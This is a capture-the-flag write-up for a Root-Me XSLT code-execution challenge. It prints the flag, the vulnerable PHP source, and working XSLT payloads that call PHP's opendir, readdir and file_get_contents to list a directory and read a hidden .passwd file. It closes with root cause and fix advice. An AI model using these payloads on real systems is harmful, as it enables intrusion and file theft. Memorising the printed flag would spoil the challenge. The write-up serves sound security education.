# Root-Me — Web-Server: XSLT - Code execution (ch50) — SOLVED

**Target:** http://challenge01.root-me.org/web-serveur/ch50/
**Challenge:** "eXtensible Stylesheet Language Transformations" (30 pts, author ghozt)
**Goal:** Read `.passwd` in a subdirectory of the challenge tree.

## Flag

```
X5L7_R0ckS
```

Byte-exact verification: `bin2hex(.passwd)` = `58354c375f5230636b530a` → `X5L7_R0ckS\n`,
and `strlen(.passwd)` = 11 (10 chars + LF). Control against a missing file returns a PHP
warning rather than content.

## Exploit

The `xsl` parameter is passed straight to `DOMDocument::load()`, so any stream wrapper works.
`data://` lets us supply our own stylesheet inline — no hosting required.

**Step 1 — list the directory.** `scandir()`/`glob()` are useless here (their array return is
stringified to `"Array"` by `php:function`), but `opendir()` + repeated no-argument
`readdir()` works, because PHP keeps the most recently opened directory handle in internal
state:

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/')"/>
    <xsl:value-of select="php:function('readdir')"/>
    <xsl:value-of select="php:function('readdir')"/>
    <!-- ... one readdir() per entry ... -->
  </xsl:template>
</xsl:stylesheet>
```

Output:

```
beers.xml   ._nginx.http-level.inc   .git      style1.xsl   ._nginx.server-level.inc
style2.xsl  ._firewall               ._perms   .            style3.xsl
index.php   ._php-fpm.pool.inc       .6ff3200bee785801f420fba826ffcdee
```

**Step 2 — read the file.**

```xml
<xsl:value-of select="php:function('file_get_contents',
    '/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
```

The subdirectory name is a **random 32-hex hash** — that is the whole difficulty of the
challenge, and it is why enumeration by guessing fails.

## Step by step

### 1. Recover the source
An XSLT payload reading its own file gives the sink:

```php
if(isset($_POST['xsl'])){
    $xml = new DOMDocument; $xml->load("beers.xml");
    $xsl = new DOMDocument; $xsl->load($_POST['xsl']);     // <-- attacker-controlled
    $proc = new XSLTProcessor;
    $proc->registerPHPFunctions();                          // <-- the RCE primitive
    $proc->importStyleSheet($xsl);
    echo $proc->transformToXML($xml);
}
```

### 2. Confirm the primitives
| Probe | Result |
|---|---|
| `file_get_contents('style1.xsl')` | works |
| `readfile`, `show_source`, `bin2hex`, `strlen`, `opendir`, `readdir` | work |
| `system`, `exec`, `shell_exec`, `passthru`, `popen`, `highlight_file` | `has been disabled for security reasons` |
| `ini_get('open_basedir')` / `phpinfo()` | `/challenge/web-serveur/ch50` |
| PHP version | 7.4.3 |

`open_basedir` confines us to the challenge directory — which is exactly where the target is.
Note it also blocks `.git/HEAD` (`.git` appears to resolve outside the allowed prefix), so the
git route is a dead end.

### 3. The dead end worth recording: brute-forcing the name
Before finding `opendir`/`readdir`, I tried to guess the path with a `file_exists` oracle —
one stylesheet can hold hundreds of `file_exists()` calls, so candidates batch nicely.

**I validated the oracle first**, against files I knew existed. That caught a real bug: XPath
stringifies a bool as `"true"`/`"false"`, not `"1"`/`""`, so my parser was silently returning
"no hits" for everything. Without that self-test I would have concluded the directory didn't
exist.

Even with the fixed oracle, **86,056 candidates produced zero hits**:

| Sweep | Candidates | Result |
|---|---|---|
| `raft-small-directories.txt` + `common.txt` | 21,437 | none |
| short names (1–2 chars, a–z0–9-_) | 1,482 | none |
| `raft-medium-directories.txt` + wordlists | 31,184 | none |
| exhaustive 3-char names | 54,872 | none |

The lesson: when you can read files but not *list* them, **look harder for a listing
primitive before spending budget on wordlists**. A random hash name is unguessable by
construction, and the `opendir()`+`readdir()` trick was available the whole time.

## Root cause

`XSLTProcessor::registerPHPFunctions()` exposes arbitrary PHP functions to the stylesheet, and
the stylesheet itself is taken from user input. Together that is remote code execution:

1. **CWE-95 / CWE-94** — the stylesheet is attacker-supplied and reaches `DOMDocument::load()`
   unfiltered. Accepting a *path* means accepting any stream wrapper (`data://`, `php://`,
   `http://`), so an attacker supplies both the code and its arguments.
2. **`registerPHPFunctions()` is the escalation.** Without it, XSLT can only read XML via
   `document()`; with it, the full PHP file API (and any non-disabled function) is reachable
   from a stylesheet.

The `disable_functions` list and `open_basedir` did their job — they removed shell execution
and confined reads to the challenge directory — but reading files inside that directory was
all that was needed.

## Fix

- **Never accept a user-supplied path to a stylesheet.** Serve the stylesheet from a fixed,
  server-side location, or map a small allow-list of identifiers (`style1` → `style1.xsl`).
  Never let the value reach `DOMDocument::load()` verbatim.
- **Do not call `registerPHPFunctions()`.** If XSLT must be used, treat the stylesheet as code:
  it is as dangerous as `eval()`. Where the stylesheet genuinely must be dynamic, constrain it
  with an XSLT allow-list/whitelist of elements, or run the transform in a sandbox with no
  filesystem and no PHP bridge.
- Keep `open_basedir` and `disable_functions` — they limited the blast radius here and are
  cheap defence in depth.
- Do not store secrets (`.passwd`, keys) inside a web-served directory tree at all.
